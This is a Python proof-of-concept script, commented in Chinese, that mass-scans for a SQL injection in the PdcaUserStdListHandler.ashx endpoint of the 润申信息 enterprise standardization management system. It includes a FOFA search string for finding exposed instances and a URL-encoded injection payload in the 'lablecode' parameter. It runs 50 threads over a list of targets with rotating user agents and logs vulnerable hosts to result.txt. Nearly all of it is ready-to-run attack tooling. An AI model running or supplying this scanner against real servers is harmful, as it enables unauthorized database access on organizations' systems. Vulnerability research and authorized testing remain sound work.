#润申信息企业标准化管理系统 PdcaUserStdListHandler.ashx SQL注入
#fofa:body="PDCA/js/_publicCom.js"

import argparse,json,requests,sys,random
from multiprocessing.dummy import Pool   #多线程库
import urllib3

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def banner():
    pass
def poc(target):
    user_agent = random.choice(user_agents)
    link1 = "/login.html"
    headers1 = {
    "User-Agent": user_agent
}
    #目标主机拒绝连接，程序后续会停止，添加try
    try:
        res1 = requests.get(url=target+link1,headers=headers1,timeout=5,verify=False)
        if res1.status_code == 200:
            link2 = "/PDCA/ashx/PdcaUserStdListHandler.ashx?action=GetDataBy"
            headers2 = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }
            data = """code=1&lablecode=-9458%29+OR+5511+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%285511%3D5511%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28107%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29--+XeuQ&LableName=&page=1&rows=20"""
            res2 = requests.post(url=target+link2,headers=headers2,data=data,timeout=5,verify=False)
            if json.loads(res2.text)["total"] == 0:
                print(f"[+]{target}存在sql注入漏洞!")
                with open('result.txt','a',encoding='utf-8')as fp:
                    fp.write(target+'\n')
            else:
                print(f"[-]{target}不存在sql注入")
        else:
            print(f"[*]{target}访问有问题，请手工检查")
    except:
        print(f"[-]{target}请求错误")



def main():
    banner()

    #第一个处理用户输入的参数
    parse = argparse.ArgumentParser(description = "润申信息企业标准化管理系统 PdcaUserStdListHandler.ashx SQL注入")

    #添加命令行的参数
    parse.add_argument('-u','--url',dest='url',type=str,help="please input your link")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input your file path")

    #实例化
    args = parse.parse_args()

    #对用户的输入做判断，url还是文件
    if args.url and not args.file:
        #开始测试
        poc(args.url)
    elif args.file and not args.url:
        #开始读取文件并逐个测试
        url_list = []
        with open(args.file,'r',encoding='utf-8')as f:
            for i in f.readlines():
                url_list.append(i.strip())
        #多线程
        print(f"[*] 已加载 {len(url_list)} 个URL进行测试")
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
        print("[*] 所有URL测试完成")
    else:
        print(f"usage:Python{sys.argv[0]}-h")

#设置程序的入口

if __name__ == "__main__":
    main()
